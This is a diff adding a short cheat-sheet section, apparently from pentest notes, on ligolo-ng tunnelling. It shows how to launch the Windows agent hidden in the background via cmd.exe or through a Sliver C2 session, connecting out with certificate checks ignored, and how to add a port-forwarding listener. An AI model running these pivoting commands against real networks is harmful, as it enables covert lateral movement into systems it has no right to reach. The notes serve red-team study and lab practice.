@@ -24,3 +24,26 @@ tunnel_start
 - verify 
 curl http://172.16.1.1
 ```
+
+### Windows Agent
+
+* start ligalo-ng windows agent in background via cmd.exe
+
+```
+cmd.exe /c start /b .\agent.exe -connect 172.16.1.100:7777 -ignore-cert
+```
+
+* start ligalo-ng windows agent via sliver session&#x20;
+
+```
+ execute -f '.\agent.exe -connect 172.16.1.20:6666 -ignore-cert'
+```
+
+### Add Listener&#x20;
+
+* add ligalo-ng listener listen on 172.16.2.5:8888 on connect forward to 10.10.14.3:8080 via tcp
+
+```
+   listener_add --addr 172.16.2.5:8888 --to 10.10.14.3:8080 --tcp
+
+```
